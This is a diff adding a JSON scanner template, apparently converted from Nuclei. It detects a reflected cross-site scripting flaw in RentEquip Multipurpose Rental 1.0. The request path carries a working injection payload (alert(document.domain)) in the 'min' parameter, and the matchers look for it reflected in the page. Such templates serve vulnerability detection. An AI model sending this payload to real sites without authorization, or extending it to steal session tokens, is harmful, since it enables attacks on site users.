@@ -1,0 +1,120 @@
+{
+  "id": "rentequip-xss",
+  "name": "RentEquip Multipurpose Rental 1.0 - Cross Site Scripting",
+  "author": "r3Y3r53",
+  "severity": "MEDIUM",
+  "description": "The attacker can send to victim a link containing a malicious URL in an email or instant message can perform a wide variety of actions, such as stealing the victim\u0027s session token or login credentials.\n",
+  "references": [
+    "https://vulners.com/packetstorm/PACKETSTORM:173002",
+    "https://www.exploitalert.com/view-details.html?id\u003d39611",
+    "https://codecanyon.net/user/kreativdev/portfolio"
+  ],
+  "tags": [
+    "xss",
+    "unauth"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {},
+  "variables": {},
+  "variablesType": "sniper",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "method": "GET",
+      "path": "{{BaseURL}}/shop/products?category\u003dcordless-tools\u0026min\u003d1026553%3balert(document.domain)%2f%2f772",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "DSL",
+          "values": [
+            "status_code \u003d\u003d 200",
+            "contains(body, \"rentequip\") \u0026\u0026 contains(body, \"1026553;alert(document.domain)//772\")",
+            "contains(content_type, \"text/html\")"
+          ],
+          "negative": false,
+          "condition": "AND",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "OR",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "rentequip-xss",
+    "info": {
+      "name": "RentEquip Multipurpose Rental 1.0 - Cross Site Scripting",
+      "author": "r3Y3r53",
+      "severity": "medium",
+      "description": "The attacker can send to victim a link containing a malicious URL in an email or instant message can perform a wide variety of actions, such as stealing the victim\u0027s session token or login credentials.\n",
+      "reference": [
+        "https://vulners.com/packetstorm/PACKETSTORM:173002",
+        "https://www.exploitalert.com/view-details.html?id\u003d39611",
+        "https://codecanyon.net/user/kreativdev/portfolio"
+      ],
+      "metadata": {
+        "max_request": 1
+      },
+      "tags": "xss,unauth"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "method": "GET",
+        "redirects": false,
+        "path": [
+          "{{BaseURL}}/shop/products?category\u003dcordless-tools\u0026min\u003d1026553%3balert(document.domain)%2f%2f772"
+        ],
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "matchers": [
+          {
+            "type": "dsl",
+            "dsl": [
+              "status_code \u003d\u003d 200",
+              "contains(body, \"rentequip\") \u0026\u0026 contains(body, \"1026553;alert(document.domain)//772\")",
+              "contains(content_type, \"text/html\")"
+            ],
+            "condition": "and"
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
